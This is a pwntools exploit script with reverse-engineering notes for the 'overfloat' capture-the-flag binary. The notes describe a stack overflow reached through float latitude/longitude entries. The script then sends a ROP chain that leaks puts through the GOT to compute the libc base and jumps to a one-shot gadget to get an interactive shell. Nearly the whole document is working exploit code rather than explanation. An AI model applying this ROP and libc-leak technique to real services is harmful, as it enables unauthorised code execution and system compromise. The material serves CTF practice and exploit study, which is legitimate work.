# RE observations:
'''
- in chart_course function, input_2 variable (that can accomodate 104 bytes) cannot be overflowed to get to return address because the fgets(input_2,100,stdin) only accepts 100 bytes
- to overflow the stack and reach return address (of main) in chart_course(), we can enter latitude/longitude input values enough times in chart_course() so that parameter that chart_course receives from main (let's call it buffer_from_main) gets overflowed, because this buffer can only contain 48 bytes
, and each time a value is entered for latitude or longitude in chart_course(), 4 bytes of data are placed in that buffer. So, if we enter 6 pairs of latitude/longitude values (each value filling 4 bytes in the buffer, so 6 pairs will fill 6 * 2 * 4 = 48 bytes), we fill the whole buffer, and entering another pair after that will fill next 2 * 4 = 8 bytes, overwriting RBP value on the stack, and the next two values, one for latitude, one for longitude, will overwrite the return address of main()
- we will have to finish execution of chart_course by entering 'done' into LAT[i] input query (not LON[i] because we must enter even number of values for lat/lon before entering 'done'), in order to return code execution to main because the return address of main is the one we are overwriting here, since the buffer sent from main to chart_course() is the one being overflowed. So to get execution to switch to payload gadgets and achieve the exploit, execution of main() will have to reach its 'ret' instruction, transferring execution to gadgets instead of main()'s intended return address
'''

# exploit: 
PUTS_PLT = 0x400690
PUTS_GOT = 0x602020
POP_RDI_RET = 0x400a83
# ONE_SHOT_GADGET = 0x4f2c5
# ONE_SHOT_GADGET = 0x10366f
ONE_SHOT_GADGET = 0xe4d5b
MAIN_START = 0x400993

from pwn import *
import struct

# helped functions for float input
pack_func = lambda x: struct.pack('f', x)
unpack_func = lambda x: struct.unpack('f', x)[0]

# if this binary was on a remote server with URL: target = remote("challenges.fbctf.com", with port number 1341, we would use:
# target = remote("challenges.fbctf.com", 1341)

target = process("./overfloat")
# gdb.attach(target)
libc = ELF("/usr/lib/libc.so.6")
# libc = ELF("./libc-2.27.so")

def sendVal(x):
    v1 = x & ((2 ** 32) - 1)
    v2 = x >> 32
    target.sendline(str(unpack_func(p32(v1))))
    target.sendline(str(unpack_func(p32(v2))))

for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

sendVal(POP_RDI_RET)
sendVal(PUTS_GOT)
sendVal(PUTS_PLT)
sendVal(MAIN_START)

target.sendline('done')
print(target.recvline('BON VOYAGE!\n'))

leak = target.recv(6)   # receive 6 bytes
leak = u64(leak + b"\x00"*(8-len(leak)))
base = leak - libc.symbols['puts']
print("libc base: " + hex(base))

for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

sendVal(base + ONE_SHOT_GADGET)
target.sendline('done')
target.interactive()
